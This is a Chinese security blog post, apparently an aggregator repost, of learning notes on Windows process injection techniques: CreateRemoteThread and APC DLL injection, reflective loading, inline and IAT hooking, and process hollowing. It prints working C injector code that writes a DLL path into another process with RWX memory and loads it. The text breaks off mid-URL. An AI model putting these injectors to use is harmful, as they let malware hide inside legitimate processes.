---
title: process-injection
url: https://buaq.net/go-135270.html
source: unSafe.sh - 不安全
date: 2022-11-13
fetch_date: 2025-10-03T22:36:33.430235
---

# process-injection

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/fad734f6cf5dcd924a5fd0be361c3f7f.jpg)

process-injection

学习一些基础的windows注入方式代码仓库https://github.com/0range-x/windows/tree/main/injectionCreateRemoteThr
*2022-11-12 01:21:19
Author: [0range-x.github.io(查看原文)](/jump-135270.htm)
阅读量:72
收藏*

---

学习一些基础的windows注入方式

代码仓库

<https://github.com/0range-x/windows/tree/main/injection>

## CreateRemoteThread

原理：

大多数Windows函数只允许一个进程对它自己操作，用来防止一个进程破坏另一个进程。但是，Windows提供了一些函数来让一个进程对另一个进程操作。

使用CreateRemoteThread 函数在其他进程空间中创建一个线程。

首先，程序在加载dll时，通常调用LoadLibrary 函数来实现dll的动态加载，loadlibrary只有一个参数，传递的是需要加载的dll路径字符串。

程序首先获取目标进程空间某个dll字符串的地址，将loadlibrary函数的地址作为多线程函数的地址，某个dll字符串作为多线程函数的参数，并传递给CreateRemoteThread函数在目标进程空间创建一个多线程

实现思路

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 1.获取被注入进程PID。 2.在注入进程的访问令牌中开启SE_DEBUG_NAME权限。 3.使用openOpenProcess()函数获取被注入进程句柄。 4.使用VirtualAllocEx()函数在被注入进程内开辟缓冲区并使用WriteProcessMemory()函数写入DLL路径的字符串。 5.使用GetProcAddress()函数在当前进程加载的kernel32.dll找到LoadLibraryA函数的地址。 6.通过CreateRemoteThread()函数来调用LoadLibraryA()函数，在被注入进程新启动一个线程，使得被注入进程进程加载恶意的DLL。 ``` |

获取进程pid

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ``` | ``` DWORD GetProcessIdByName(LPCTSTR lpszProcessName) { 	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 	if (hSnapshot == INVALID_HANDLE_VALUE) 	{ 		return 0; 	}  	PROCESSENTRY32 pe; 	pe.dwSize = sizeof pe;  	if (Process32First(hSnapshot, &pe)) 	{ 		do { 			if (lstrcmpi(lpszProcessName, pe.szExeFile) == 0) 			{ 				CloseHandle(hSnapshot); 				return pe.th32ProcessID; 			} 		} while (Process32Next(hSnapshot, &pe)); 	}  	CloseHandle(hSnapshot); 	return 0; } ``` |

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 ``` | ``` int main() { 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, GetProcessIdByName((LPCTSTR)"fg.exe")); 	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, 0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 	WriteProcessMemory(hProcess, lpBaseAddress, path, sizeof(path), NULL); 	LPTHREAD_START_ROUTINE pLoadlibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"); 	CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)pLoadlibrary, lpBaseAddress, 0, 0); 	return 0; } ``` |

![image-20221012133914979](https://0range-x.github.io/2022/11/12/inject/image-20221012133914979.png)

## apc注入

原理：

apc为异步过程调用，指函数在指定线程中被异步执行。在Windows系统中，每个线程都会维护一个线程apc队列，通过QueryUserApc 把一个apc函数田家达奥指定线程的apc队列中。每个线程都有自己的apc队列，这个apc队列记录了要求线程执行的一些apc函数。

一个进程包含多个线程，为了确保能够执行插入的apc，应该向目标进程的所有线程都插入相同的apc，实现加载dll的操作。这样，只要唤醒进程中的任意线程，开始执行apc的时候，便会执行插入的apc函数，实现dll注入

步骤：

可以看到需要找到目标线程，那么我们肯定是需要获取线程id，而在这之前需要先获取进程id，之后和远程线程注入的区别就在于 使用apc函数注入

获取线程id

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ``` | ``` BOOL GetAllThreadIdByProcessId(DWORD dwProcessId){ 	DWORD dwBufferLength = 1000; 	THREADENTRY32 te32 = { 0 }; 	HANDLE hSnapshot = NULL; 	BOOL bRet = TRUE; 	 	RtlZeroMemory(&te32, sizeof(te32)); 	te32.dwSize = sizeof(te32); 	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);  	 	bRet = Thread32First(hSnapshot, &te32); 	while (bRet){ 		 		if (te32.th32OwnerProcessID == dwProcessId){ 			return te32.th32ThreadID; 		} 		 		bRet = Thread32Next(hSnapshot, &te32); 	} 	return 0; } ``` |

main

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 ``` | ``` int main(int argc, char* argv) { 	FARPROC pLoadLibrary = NULL; 	HANDLE hThread = NULL; 	HANDLE hProcess = 0; 	DWORD dwTID = 0; 	DWORD dwPID = 0; 	BYTE dllname[] = "C:\\users\\hack\\desktop\\test\\Dll.dll"; 	LPVOID lpAddr = NULL; 	dwPID = GetProcessIdByName((LPCTSTR)"fg.exe"); 	hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwPID); 	if (hProcess == NULL) { 		printf("[-] Failed to OpenProcess. Error: %d", GetLastError()); 		return -1; 	} 	pLoadLibrary = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"); 	if (pLoadLibrary == NULL) { 		printf("[-] Failed to GetProcAddress. Error: %d", GetLastError()); 		return -1; 	} 	lpAddr = VirtualAllocEx(hProcess, 0, sizeof(dllname) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 	if (lpAddr == NULL) { 		printf("[-] Failed to VirtualAllocEx. Error: %d", GetLastError()); 		return -1; 	} 	if (!WriteProcessMemory(hProcess, lpAddr, dllname, sizeof(dllname) + 1, NULL)) { 		printf("[-]Failed to WriteProcessMemory. Error: %d", GetLastError()); 		return -1; 	} 	 	dwTID = GetAllThreadIdByProcessId(dwPID); 	hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, dwTID); 	if (hThread == NULL) { 		printf("[-] Failed to OpenThread. Error: %d", GetLastError()); 		return -1; 	} 	QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)lpAddr); 	printf("[+] Inject successfully.\n"); 	CloseHandle(hProcess); 	CloseHandle(hThread); 	return 0; } ``` |

错误总结：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` 1.分配内存时 VirtualAllocEx 的第4个参数 只能用MEM_COMMIT,表示当前内存正在被使用 ,不能使用MEM_RELEASE 2.测试失败，调试了很久，每一步都没报错，就是没有办法弹窗，在Win10 和win7 测试 ``` |

## Reflective 注入

关键在于reflectiveloader

原理：

不依赖于Windows提供的loadlibrary 函数，设计者自己在程序内实现pe的内存展开，由于是自己实现，所以不会在操作系统中有记录。以及可以对展开的pe文件做一些处理，比如抹除dos头，同时不会再peb的ldr链表中记录。

步骤实现

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` 1.获取被注入进程为解析的dll的及地址 2.获得dll句柄和函数为修复导入表做准备 3.分配一块新内存去解析dll，并把pe头复制到新内存中和将各节复制到新内存中 4.修复重定向表和导入表 5.执行dllmain函数 ``` |

在反射dll时，我们需要将dll的所有依赖库加载到当前进程中，并修复IAT以确保dll导入的函数指向当前进程内存空间的正确函数地址。为了加载依赖库，需要遍历所有的 Import Descriptor 。

在读取并加载相应的库之后，我们需要遍历所有thunk，使用`GetProcAddress` 解析他们的地址并将他们放入IAT中，以便dll可以在需要时引用他们。

在这之后，IAT修复完毕，可以执行dll了。

tips：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` DWORD_PTR 这个类型可以放下一个DWORD类型 并且放下一个指针，在64位的环境下混用很可能造成程序越界崩溃 *_ptr 是在64位的新类型用来代替32位下的DWORD ``` |

代码

<https://github.com/0range-x/windows/blob/main/injection/reflective.cpp>

## API Hook

#### Inline Hook覆盖代码 -修改函数代码

可以看到这里代码有一点麻烦，相比较IAT hook，需要去看硬编码，但是如果函数不是以 `LoadLibrary`加载，就不会出现在导入表里，IAT hook就无法使用，只能使用InLine hook

以messageboxA为例

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 ``` | ``` 1.获取MessageBoxA 函数的内存地址 2.读取MessageBoxA的前6个字节 3.创建一个hook函数 在被hook函数执行的时候执行 4.获取hook函数的内存地址 5.patch 被hook函数，重定向到hook函数 6.调用被hook函数 7.执行hook函数 ``` |

messageboxA的地址**76E60570**

代码仓库：

<https://github.com/0range-x/windows/blob/main/injection/jmphook.cpp>

#### IAT hook -修改函数地址

其中IAT hook前后的区别

hook前

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` 1.调用messageBoxA函数 2.程序在IAT中查找MessageBoxA的地址 3.代码执行跳转到第二步解析的地址 ``` |

hook后

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` 1.像hook之前一样调用MessageBoxA 2.在IAT中查找MessageBoxA的地址 3.因为IAT被修改，IAT中MessageBoxA的地址指向了hookedMessagebox函数地址 4.程序跳转到hookedMessagebox 5.hookedmessagebox 函数拦截MessageBoxA参数并执行一些恶意代码 6.hookedMessageBox 调用合法的MessageBoxA例程 ``` |

说明：

IAT hook通常由诸如目标进程的dll执行，为了简便，在下面的例子中，IAT hook 是在本地进程实现的

IAT hook大致步骤：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` 1.保存原来的MessageBoxA内存地址 2.定义MessageBoxA函数原型 3.使用上述原型创建一个HookedMessagebox函数 4.解析IAT表，直到找到MessageBoxA的地址 5.用hookedMessagebox的地址替换MessageBoxA的地址 ``` |

IATHook

<https://github.com/0range-x/windows/blob/main/injection/IAThook.cpp>

## hollowing

进程镂空，又叫傀儡进程，是一种防御规避的进程注入技术，主要思想是写在合法进程的内存，写入恶意软件的代码，伪装成合法进程进行恶意活动。

看到有些文章说需要取消生成重定位表，但是我这里没有取消，也是可以正常镂空注入成功的，是因为在使用`VirtualAllocEx`申请内存空间是，将傀儡进程的`ImageBaseAddress`作为申请空间的首地址，这样就避免了重定位的问题。

![image-20221018162621742](https://0range-x.github.io/2022/11/12/inject/image-20221018162621742.png)

peb偏移8个字节处， 这个进程的装载地址，就是pe可选头里的imagebase

![image-20221019111241988](https://0range-x.github.io/2022/11/12/inject/image-20221019111241988.png)

两种方式：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` 1.镂空已有进程模块：直接修改进程中已有模块的代码节，注入恶意代码 2.先注入后镂空：注入一个合法dll(拥有合法签名)，然后修改dll入口点出代码为自己想执行的代码 ``` |

#### process hollowing

![img](https://www.malwarebyte...